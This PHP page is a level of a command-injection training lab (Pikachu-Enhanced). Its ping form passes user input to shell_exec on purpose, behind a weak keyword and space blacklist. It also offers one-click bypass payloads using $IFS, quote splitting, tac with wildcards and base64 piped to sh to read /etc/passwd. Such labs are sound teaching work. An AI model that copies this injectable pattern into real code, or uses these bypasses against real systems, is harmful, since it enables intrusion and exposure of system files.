<?php
/**
 * Pikachu-Enhanced v2.0 - 命令注入过滤与 WAF 绕过 (Command Injection WAF Bypass)
 */
$PIKA_ROOT_DIR = "../../";
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[50] = 'active open';
$ACTIVE[54] = 'active';
include_once $PIKA_ROOT_DIR . 'header.php';

$output = "";
$waf_blocked = false;
$block_reason = "";
$user_ip = $_POST['ip'] ?? '';

if (isset($_POST['submit']) && !empty($user_ip)) {
    // 模拟常见命令注入 WAF 拦截规则（拦截空格、cat、flag、passwd、ls）
    $blacklisted_keywords = ['cat', 'flag', 'passwd', 'ls'];
    $has_blocked_word = false;
    foreach ($blacklisted_keywords as $word) {
        if (stripos($user_ip, $word) !== false) {
            $has_blocked_word = $word;
            break;
        }
    }

    if (strpos($user_ip, ' ') !== false) {
        $waf_blocked = true;
        $block_reason = "检测到原生空格字符 (Space 0x20)！已被防御策略拦截。";
    } elseif ($has_blocked_word !== false) {
        $waf_blocked = true;
        $block_reason = "检测到敏感系统命令/文件关键字 [<code>" . htmlspecialchars($has_blocked_word) . "</code>]！";
    } else {
        // 执行命令
        if (stristr(php_uname('s'), 'Windows NT')) {
            $cmd = "ping " . $user_ip;
        } else {
            $cmd = "ping -c 2 " . $user_ip;
        }
        
        $res = @shell_exec($cmd);
        $output = $res ?: "命令已执行，但无标准输出内容。";
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="rce.php">RCE</a></li>
                <li class="active">命令注入 WAF 绕过</li>
            </ul>
            <a href="#" class="tips-btn" data-container="body" data-toggle="popover" data-placement="bottom" title="💡 绕过技巧" data-content="空格可用 ${IFS} 或 $IFS$9 替代；cat 可用 tac、more、tail、c''at 或 c\at 绕过！">
                <i class="fa fa-lightbulb-o"></i> 攻防提示
            </a>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🛡️ 关卡 3: 命令注入黑名单与 WAF 过滤绕过实战
                        <span class="cyber-badge-chip">RCE · 字符混淆 · 环境变量绕过 · 200 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        在实际渗透测试中，后端常通过正则过滤空格和敏感命令名。攻击者可利用 Bash/Shell 语法特性：<b>使用 <code>${IFS}</code> / <code>$IFS$9</code> / <code>&lt;</code> 替换空格</b>、<b>使用单双引号拼接 <code>c''at</code>、反斜杠 <code>c\at</code>、通配符 <code>/bin/c*t</code>、Base64 编码 <code>echo Y2F0...|base64 -d|sh</code></b> 实施完美绕过！
                    </p>
                </div>

                <div class="row">
                    <!-- Left: Ping Console -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-terminal" style="color:var(--primary);"></i> 网络连通性测试 (受 WAF 防护)
                            </h4>

                            <form method="POST" action="rce_bypass.php">
                                <div class="form-group" style="margin-bottom:12px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">目标 IP 地址 (禁止输入空格、cat、flag、ls)：</label>
                                    <input class="form-control" type="text" id="ip_input" name="ip" value="<?php echo htmlspecialchars($user_ip); ?>" placeholder="127.0.0.1" style="font-family:monospace;" required />
                                </div>

                                <div style="margin-bottom:16px;">
                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
                                        ⚡ 快速测试 WAF 绕过 Payload：
                                    </label>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillIp('127.0.0.1;cat /etc/passwd')">
                                            <i class="fa fa-times" style="color:#ef4444;"></i> <b>未绕过测试：</b> <code>127.0.0.1;cat /etc/passwd</code> (将被拦截)
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillIp('127.0.0.1;ca\'\'t$IFS/etc/pass\'\'wd')">
                                            <i class="fa fa-bolt" style="color:#10b981;"></i> <b>IFS + 引号拼接：</b> <code>127.0.0.1;ca''t$IFS/etc/pass''wd</code>
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillIp('127.0.0.1;tac$IFS$9/etc/pass*')">
                                            <i class="fa fa-bolt" style="color:#06b6d4;"></i> <b>tac 替代 + 通配符：</b> <code>127.0.0.1;tac$IFS$9/etc/pass*</code>
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillIp('127.0.0.1;echo$IFS$9Y2F0IC9ldGMvcGFzc3dk|base64$IFS$9-d|sh')">
                                            <i class="fa fa-bolt" style="color:#8b5cf6;"></i> <b>Base64 管道解码执行：</b> <code>echo Y2F0...|base64 -d|sh</code>
                                        </button>
                                    </div>
                                </div>

                                <button type="submit" name="submit" value="submit" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:10px;">
                                    <i class="fa fa-play"></i> 执行命令检测
                                </button>
                            </form>
                        </div>
                    </div>

                    <!-- Right: Execution Result -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> WAF 状态与执行回显
                            </h4>

                            <?php if ($waf_blocked): ?>
                                <div class="alert alert-danger" style="border-radius:8px; font-size:13px; font-weight:600; margin-bottom:12px;">
                                    <i class="fa fa-ban"></i> <b>WAF 拦截告警：</b> <?php echo $block_reason; ?>
                                </div>
                            <?php elseif (!empty($output)): ?>
                                <div class="alert alert-success" style="border-radius:8px; font-size:13px; font-weight:600; margin-bottom:12px;">
                                    <i class="fa fa-check-circle"></i> 💥 <b>WAF 绕过成功！命令已执行。</b>
                                </div>
                                <pre style="background:#090d16; color:#10b981; border:1px solid #1e293b; border-radius:8px; padding:14px; font-family:'Fira Code', monospace; font-size:12px; line-height:1.6; max-height:260px; overflow-y:auto;"><?php echo htmlspecialchars($output); ?></pre>
                            <?php else: ?>
                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:30px; text-align:center; color:var(--text-muted); font-size:13px;">
                                    <i class="fa fa-shield" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                                    点击左侧绕过 Payload 测试 WAF 过滤防护
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="rce_eval.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：代码注入 (eval)</a>
                    <a href="rce_blind.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：无回显盲 RCE <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function fillIp(v) {
    document.getElementById('ip_input').value = v;
    document.forms[0].submit();
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
